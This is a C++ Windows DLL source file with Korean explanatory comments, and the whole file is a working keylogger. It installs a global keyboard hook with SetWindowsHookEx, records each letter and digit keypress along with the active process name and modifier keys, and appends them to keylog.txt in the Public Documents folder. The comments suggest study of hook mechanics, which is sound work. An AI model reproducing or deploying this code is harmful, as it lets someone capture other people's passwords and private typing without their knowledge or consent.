// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"
#include <stdio.h>

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hModule;
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    char szPath[MAX_PATH] = { 0, };
    char* p = NULL;
    FILE* fp = NULL;
    char str[3] = "";
    char ch;

    if (nCode >= 0)
    {
        // 키가 눌렸을 때는 32번째 비트가 0, 키가 떨어졌을 때는 32번째 비트가 1로 메시지가 날아온다.
        // if(lParam & 0x80000000) 조건을 사용하면 키가 눌렸을 때(KEY_DOWN) 이벤트 처리를 할 수 있다.
        if (!(lParam & 0x80000000)) {
            // 상단 숫자 키 || 문자 키 || 숫자 키패드
            if ((wParam >= 0x30 && wParam <= 0x39) || (wParam >= 0x41 && wParam <= 0x5A) || (wParam >= 0x60 && wParam <= 0x69)) {
                GetModuleFileNameA(NULL, szPath, MAX_PATH);
                p = strrchr(szPath, '\\');

                fopen_s(&fp, "C:\\Users\\Public\\Documents\\keylog.txt", "a");
                if (fp) {
                    // 프로세스 출력
                    fputs(p + 1, fp);
                    fputc('\t', fp);

                    // 입력키 출력
                    // Ctrl키가 눌려 있음
                    if (GetKeyState(VK_CONTROL) & 0x80) {
                        fputs("Ctrl + ", fp);
                    }
                    // Alt키가 눌려 있음
                    if (GetKeyState(VK_MENU) & 0x80) {
                        fputs("Alt + ", fp);
                    }
                    // Shift키가 눌려 있음
                    if (GetKeyState(VK_SHIFT) & 0x80) {
                        fputs("Shift + ", fp);
                    }
                    sprintf_s(str, "%c\n", wParam);
                    fputs(str, fp);
                    fclose(fp);
                }
            }
        }
    }

    // 응용프로그램 (혹은 다음 훅) 으로 메시지를 전달함
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

extern "C" {    // c++의 네임 맹글링(Name Mangling) 적용하지 않는다
    __declspec(dllexport) void HookStart()
    {
        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
    }

    __declspec(dllexport) void HookStop()
    {
        if (g_hHook) {
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
        }
    }
}